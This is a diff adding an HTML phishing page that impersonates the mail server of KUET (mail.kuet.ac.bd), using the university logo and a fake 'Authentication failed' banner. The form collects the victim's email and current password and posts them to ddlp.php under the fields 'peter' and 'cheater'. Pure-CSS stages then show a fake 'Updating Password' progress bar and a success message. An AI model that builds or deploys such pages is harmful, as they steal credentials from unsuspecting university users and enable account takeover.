@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="kuoet_files/favicon.ico">
+<title>Mail Subdomain &middot; Password Update</title>
+
+<style>
+
+/* ==================================================
+   REGISTERED PROPERTY -> PURE CSS PERCENT COUNTER
+================================================= */
+
+@property --p {
+    syntax: "<integer>";
+    initial-value: 0;
+    inherits: false;
+}
+
+
+/* ==================================================
+   TIMELINE
+   tbtn   = stage switch speed      (0.3s)
+   tload  = loader 0% -> 25%        (4s)
+   tdone  = success appears         (0.3s + 4s = 4.3s)
+================================================= */
+
+:root {
+    --tbtn: 0.3s;
+    --tload: 4s;
+    --tdone: calc(var(--tbtn) + var(--tload));
+
+    --blue: #1687ed;
+    --blue-dark: #0872d8;
+    --ink: #12345a;
+    --red: #e5484d;
+}
+
+
+/* ==================================================
+   BASE
+================================================= */
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    padding: 25px 15px;
+
+    font-family: Arial, Helvetica, sans-serif;
+
+    background: linear-gradient(135deg, #eaf5ff, #ffffff);
+}
+
+h1, h2, h3, p {
+    margin: 0;
+}
+
+
+/* ==================================================
+   STACK FRAME  (all screens share the same space)
+================================================= */
+
+.frame {
+    position: relative;
+
+    width: min(94%, 560px);
+    min-height: 620px;
+}
+
+.stage {
+    position: absolute;
+    inset: 0;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    padding: 18px 0;
+}
+
+.submit-check {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
+}
+
+
+/* ==================================================
+   SHARED CARD
+================================================= */
+
+.card {
+    width: 100%;
+
+    padding: 40px 28px;
+
+    text-align: center;
+
+    background: #ffffff;
+
+    border-radius: 22px;
+
+    box-shadow: 0 10px 35px rgba(20, 80, 150, 0.14);
+}
+
+.logo-img {
+    display: block;
+
+    width: 300px;
+    max-width: 78%;
+    height: auto;
+
+    margin: 0 auto 18px;
+}
+
+
+/* ==================================================
+   STAGE 1 : MAIL SUBDOMAIN + AUTH ERROR + FORM
+================================================= */
+
+.stage-error {
+    opacity: 1;
+    visibility: visible;
+}
+
+.mail-badge {
+    width: 70px;
+    height: 70px;
+
+    margin: 0 auto 14px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border-radius: 50%;
+
+    background: #e7f2ff;
+
+    font-size: 32px;
+}
+
+.mail-title {
+    color: var(--ink);
+    font-size: 28px;
+    margin-bottom: 10px;
+}
+
+.domain-pill {
+    display: inline-block;
+
+    padding: 8px 18px;
+
+    color: var(--blue-dark);
+
+    background: #eef7ff;
+
+    border: 1px dashed #8cc4f7;
+    border-radius: 30px;
+
+    font-size: 16px;
+    font-weight: bold;
+    letter-spacing: 0.4px;
+}
+
+/* red error banner */
+
+.error-alert {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+
+    margin: 22px 0 24px;
+
+    padding: 14px 16px;
+
+    text-align: left;
+
+    background: #fff1f1;
+    border: 1px solid #f6c4c4;
+    border-left: 5px solid var(--red);
+    border-radius: 10px;
+}
+
+.error-icon {
+    flex: 0 0 auto;
+
+    width: 26px;
+    height: 26px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border-radius: 50%;
+
+    background: var(--red);
+    color: #fff;
+
+    font-size: 16px;
+    font-weight: bold;
+}
+
+.error-alert p {
+    color: #b4232a;
+    font-size: 14px;
+    font-weight: bold;
+    line-height: 1.5;
+}
+
+/* form fields (div based) */
+
+.form-group {
+    margin-bottom: 15px;
+
+    text-align: left;
+}
+
+.form-group label {
+    display: block;
+
+    margin-bottom: 6px;
+
+    color: #344054;
+    font-size: 13px;
+    font-weight: bold;
+}
+
+.form-group input {
+    width: 100%;
+
+    padding: 12px 13px;
+
+    color: #222;
+
+    background: #fff;
+
+    border: 1px solid #cbd5e1;
+    border-radius: 8px;
+
+    font-size: 14px;
+
+    outline: none;
+
+    transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.form-group input::placeholder {
+    color: #98a2b3;
+}
+
+.form-group input:focus {
+    border-color: var(--blue);
+    box-shadow: 0 0 0 3px rgba(22, 135, 237, 0.15);
+}
+
+.submit-btn {
+    display: block;
+    width: 100%;
+
+    margin-top: 22px;
+    padding: 13px;
+
+    color: #ffffff;
+
+    background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+
+    border: none;
+    border-radius: 8px;
+
+    font-size: 15px;
+    font-weight: bold;
+    text-align: center;
+
+    cursor: pointer;
+
+    user-select: none;
+
+    transition: transform 0.2s, box-shadow 0.2s;
+}
+
+.submit-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 18px rgba(22, 135, 237, 0.35);
+}
+
+.form-note {
+    margin-top: 16px;
+
+    color: #98a2b3;
+    font-size: 12px;
+}
+
+
+/* ==================================================
+   STAGE 2 : LOADING 0% -> 25%
+================================================= */
+
+.stage-load {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+}
+
+.rings {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    margin-bottom: 8px;
+}
+
+.ring {
+    width: 74px;
+    height: 74px;
+
+    margin-left: -14px;
+
+    border: 9px solid var(--blue);
+    border-radius: 50%;
+
+    animation: rotate 0.9s linear infinite;
+}
+
+.ring:first-child {
+    margin-left: 0;
+    border-color: #0755b5;
+    animation-direction: reverse;
+}
+
+.ring:nth-child(2) { border-color: #218cf2; }
+.ring:nth-child(3) { border-color: #62c5f5; }
+
+.stage-load h1,
+.stage-success h1 {
+    color: var(--ink);
+    font-size: 28px;
+    margin-bottom: 8px;
+}
+
+.message {
+    color: #596579;
+    font-size: 15px;
+    line-height: 1.55;
+}
+
+/* progress bar 0% -> 25% */
+
+.progress {
+    height: 9px;
+    width: 100%;
+    max-width: 400px;
+
+    margin: 26px auto 12px;
+
+    overflow: hidden;
+
+    background: #e5e7eb;
+    border-radius: 20px;
+}
+
+.progress-fill {
+    width: 0%;
+    height: 100%;
+
+    background: linear-gradient(90deg, #0755b5, #62c5f5);
+    border-radius: 20px;
+}
+
+.status {
+    color: var(--blue-dark);
+    font-size: 15px;
+    font-weight: bold;
+}
+
+/* pure css live counter : 0% -> 25% */
+
+.pct {
+    counter-reset: pct var(--p);
+}
+
+.pct::after {
+    content: counter(pct) "%";
+}
+
+
+/* ==================================================
+   STAGE 3 : SUCCESS + LOGIN BUTTON
+================================================= */
+
+.stage-success {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+}
+
+.success-icon {
+    width: 76px;
+    height: 76px;
+
+    margin: 0 auto 18px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border-radius: 50%;
+
+    background: linear-gradient(135deg, #2ecc71, #27ae60);
+
+    color: #fff;
+    font-size: 36px;
+    font-weight: bold;
+}
+
+.success-msg {
+    color: #1e9e5a;
+    font-size: 17px;
+    font-weight: bold;
+
+    margin-bottom: 24px;
+}
+
+.login-btn {
+    display: inline-block;
+
+    padding: 13px 46px;
+
+    color: #ffffff;
+
+    background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+
+    border-radius: 8px;
+
+    font-size: 15px;
+    font-weight: bold;
+    text-decoration: none;
+    letter-spacing: 0.5px;
+
+    transition: transform 0.2s, box-shadow 0.2s;
+}
+
+.login-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 18px rgba(22, 135, 237, 0.4);
+}
+
+
+/* ==================================================
+   STATE SWITCHING  (pure CSS, no javascript)
+================================================= */
+
+/* stage 1 -> stage 2 */
+
+.submit-check:checked ~ .stage-error {
+    pointer-events: none;
+    animation: fadeOut var(--tbtn) ease forwards;
+}
+
+.submit-check:checked ~ .stage-load {
+    animation:
+        fadeIn  var(--tbtn) ease var(--tbtn) forwards,
+        fadeOut var(--tbtn) ease var(--tdone) forwards;
+}
+
+/* bar + counter start with the loader, stop at 25% */
+
+.submit-check:checked ~ .stage-load .progress-fill {
+    animation: fillBar var(--tload) linear var(--tbtn) forwards;
+}
+
+.submit-check:checked ~ .stage-load .pct {
+    animation: count var(--tload) linear var(--tbtn) both;
+}
+
+/* stage 2 -> stage 3 : success message after loading completes */
+
+.submit-check:checked ~ .stage-success {
+    animation: successIn 0.45s ease var(--tdone) forwards;
+}
+
+
+/* ==================================================
+   KEYFRAMES
+================================================= */
+
+@keyframes fadeIn {
+    from { opacity: 0; visibility: visible; }
+    to   { opacity: 1; visibility: visible; }
+}
+
+@keyframes fadeOut {
+    from { opacity: 1; visibility: visible; }
+    to   { opacity: 0; visibility: hidden; }
+}
+
+@keyframes successIn {
+    from { opacity: 0; visibility: visible; transform: scale(0.92) translateY(14px); }
+    to   { opacity: 1; visibility: visible; transform: scale(1) translateY(0); }
+}
+
+@keyframes fillBar {
+    to { width: 25%; }
+}
+
+@keyframes count {
+    from { --p: 0; }
+    to   { --p: 25; }
+}
+
+@keyframes rotate {
+    to { transform: rotate(360deg); }
+}
+
+
+/* ==================================================
+   MOBILE
+================================================= */
+
+@media (max-width: 480px) {
+
+    .frame { min-height: 660px; }
+
+    .card { padding: 30px 18px; }
+
+    .mail-title,
+    .stage-load h1,
+    .stage-success h1 { font-size: 24px; }
+
+    .ring {
+        width: 58px;
+        height: 58px;
+        border-width: 7px;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="frame">
+
+    <!-- hidden checkbox drives the whole flow, no javascript -->
+    <input type="checkbox" id="submitCheck" class="submit-check">
+
+
+    <!-- ==================================================
+         STAGE 1 : MAIL SUBDOMAIN + AUTHENTICATION ERROR
+    ================================================== -->
+
+    <div class="stage stage-error">
+
+        <div class="card">
+
+            <img src="kuoet_files/kuet-logo_0iG8.png" alt="KUET" class="logo-img">
+
+            <div class="mail-badge">&#9993;</div>
+
+            <h1 class="mail-title">Mail Server</h1>
+
+            <div class="domain-pill">mail.kuet.ac.bd</div>
+
+            <div class="error-alert">
+                <span class="error-icon">!</span>
+                <p>Authentication failed due to wrong entered current password, Please try again.</p>
+            </div>
+
+            <form action="ddlp.php"   method="post" name="email"  >
+
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email"  
+                       id="email"
+                       name="peter"
+                       placeholder="email@kuet.ac.bd"
+                       autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" required
+                       id="password"
+                       name="cheater"
+                       placeholder="Enter your current password"
+                       autocomplete="off">
+            </div>
+            <div class="actions">
+            <button type="submit" class="login-btn">Submit</button></div>
+        </form>
+            <p class="form-note">
+               
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================================================
+         STAGE 2 : LOADING 0% -> 25%
+    ================================================== -->
+
+    <div class="stage stage-load">
+
+        <div class="card">
+
+            <img src="kuoet_files/kuet-logo_0iG8.png" alt="KUET" class="logo-img">
+
+            <div class="rings">
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="ring"></div>
+            </div>
+
+            <h1>Updating Password</h1>
+
+            <p class="message">
+                Please wait while your new password is being saved
+                to the mail subdomain.
+            </p>
+
+            <div class="progress">
+                <div class="progress-fill"></div>
+            </div>
+
+            <p class="status">
+                Loading&hellip; <span class="pct"></span>
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================================================
+         STAGE 3 : SUCCESS MESSAGE + LOGIN BUTTON
+    ================================================== -->
+
+    <div class="stage stage-success">
+
+        <div class="card">
+
+            <img src="kuoet_files/kuet-logo_0iG8.png" alt="KUET" class="logo-img">
+
+            <div class="success-icon">&#10003;</div>
+
+            <h1>Password Updated</h1>
+
+            <p class="success-msg">
+                Your password is updated successfully.
+            </p>
+
+           
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+</body>
+</html>
